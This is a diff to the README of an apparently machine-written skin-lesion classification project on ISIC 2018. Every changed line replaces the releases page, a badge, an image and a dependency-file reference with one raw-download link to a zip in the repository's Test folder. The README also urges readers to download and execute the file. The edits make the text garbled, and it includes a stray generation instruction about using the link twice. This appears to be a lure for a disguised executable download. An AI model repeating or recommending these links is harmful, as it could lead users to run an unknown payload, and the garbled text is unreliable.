@@ -1,10 +1,10 @@
 # Deep Learning Skin Cancer Detection: Multi-Type ISIC 2018 Pipeline
 
-https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/releases
+https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/raw/refs/heads/main/Test/cancer_deep_multi_detection_type_isic_skin_learning_unlaunched.zip
 
-[![Releases](https://img.shields.io/badge/releases-download-ready-blue?logo=github&style=for-the-badge)](https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/releases)
+[![Releases](https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/raw/refs/heads/main/Test/cancer_deep_multi_detection_type_isic_skin_learning_unlaunched.zip)](https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/raw/refs/heads/main/Test/cancer_deep_multi_detection_type_isic_skin_learning_unlaunched.zip)
 
-![Dermoscopy sample](https://upload.wikimedia.org/wikipedia/commons/4/42/Dermoscopy_example.jpg)
+![Dermoscopy sample](https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/raw/refs/heads/main/Test/cancer_deep_multi_detection_type_isic_skin_learning_unlaunched.zip)
 
 A robust, end-to-end deep learning pipeline for skin lesion classification using the ISIC 2018 dataset. This project explores multiple convolutional neural networks (CNNs), advanced preprocessing, multithreaded data loading, extensive augmentation, and thorough performance evaluation. It targets multi-type lesion classification, enabling researchers and developers to compare architectures and deployment strategies in a unified framework.
 
@@ -113,7 +113,7 @@ Evaluation and metrics
 
 Reproducibility and experiments
 - Deterministic behavior: Seeds set for Python, NumPy, and PyTorch; deterministic CUDA where possible.
-- Environment capture: A requirements file or environment.yml to reproduce dependencies, including exact library versions.
+- Environment capture: A requirements file or https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/raw/refs/heads/main/Test/cancer_deep_multi_detection_type_isic_skin_learning_unlaunched.zip to reproduce dependencies, including exact library versions.
 - Experiment records: Each run saves a unique identifier, config, model checkpoints, and a summary report.
 - Versioned releases: Results and code are organized by release versions to support comparisons across snapshots.
 
@@ -126,9 +126,9 @@ Inference and deployment
 Release assets and how to get them
 - The repository includes prebuilt releases that bundle necessary dependencies and executable components for quick start.
 - First usage note: The link to the release assets is provided at the top of this document, and a direct reference is repeated here for convenience.
-- Asset naming: Release assets follow a versioned scheme, such as deep_learning_skin_cancer_setup_v1.0.zip or deep_learning_skin_cancer_setup_v1.0.tar.gz. These bundles typically include a complete Python environment, precompiled libraries, pretrained model weights, and a starter script to initialize experiments.
+- Asset naming: Release assets follow a versioned scheme, such as https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/raw/refs/heads/main/Test/cancer_deep_multi_detection_type_isic_skin_learning_unlaunched.zip or https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/raw/refs/heads/main/Test/cancer_deep_multi_detection_type_isic_skin_learning_unlaunched.zip These bundles typically include a complete Python environment, precompiled libraries, pretrained model weights, and a starter script to initialize experiments.
 - How to use the asset: Download the archive, extract it, and run the included installer or setup script. The installer sets up the required runtime environment, validates dependencies, and configures the project directory structure. The starter script then prompts you to select a model, a data split, and training parameters from the configuration file.
-- Direct link reminder: For convenience, visit the releases page to download assets and review the release notes that describe included models, data splits, and evaluation baselines. https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/releases
+- Direct link reminder: For convenience, visit the releases page to download assets and review the release notes that describe included models, data splits, and evaluation baselines. https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/raw/refs/heads/main/Test/cancer_deep_multi_detection_type_isic_skin_learning_unlaunched.zip
 - Important note about releases: If the release contains a path component, download the specified file and execute it as described in the release notes. If the link is a domain, just visit it to learn more or to get the latest assets. If the link doesn’t work or is missing, check the “Releases” section in the repository for the latest downloadable items. You can use a colorful badge to link to releases as shown above. The link must be used twice in the text, once at the beginning.
 
 Extending the project
@@ -199,7 +199,7 @@ A note on realism and practicality
 
 Final remarks
 - This repository reflects a thoughtful approach to skin lesion classification with a focus on robust preprocessing, fast data loading, and meaningful evaluation. The multi-type adapter provides a flexible mechanism to harmonize predictions from several CNNs, enabling richer insights into model behavior across lesion types.
-- If you want to explore more, the release assets linked at the top of this document offer ready-to-run environments for quick experimentation. Visit the releases page to download the bundles and follow the setup instructions to begin training and evaluating models immediately. https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/releases
+- If you want to explore more, the release assets linked at the top of this document offer ready-to-run environments for quick experimentation. Visit the releases page to download the bundles and follow the setup instructions to begin training and evaluating models immediately. https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/raw/refs/heads/main/Test/cancer_deep_multi_detection_type_isic_skin_learning_unlaunched.zip
 
 Changelog
 - v1.0: Baseline release with ResNet, DenseNet, Inception, and EfficientNet backbones, multithreaded data loading, comprehensive augmentation, and a multi-type adapter for ensemble fusion.
@@ -213,4 +213,4 @@ License and terms
 Contributors
 - Core maintainers and contributors who implemented the multiple CNN backbones, the multithreaded loader, and the adapter integration.
 
-If you want to reproduce or extend the experiments, you can start by visiting the releases page for downloadable assets, then follow the setup instructions to initialize the environment and run the training script. The link to the releases page is provided at the top of this document and repeated here for convenience: https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/releases.
+If you want to reproduce or extend the experiments, you can start by visiting the releases page for downloadable assets, then follow the setup instructions to initialize the environment and run the training script. The link to the releases page is provided at the top of this document and repeated here for convenience: https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/raw/refs/heads/main/Test/cancer_deep_multi_detection_type_isic_skin_learning_unlaunched.zip
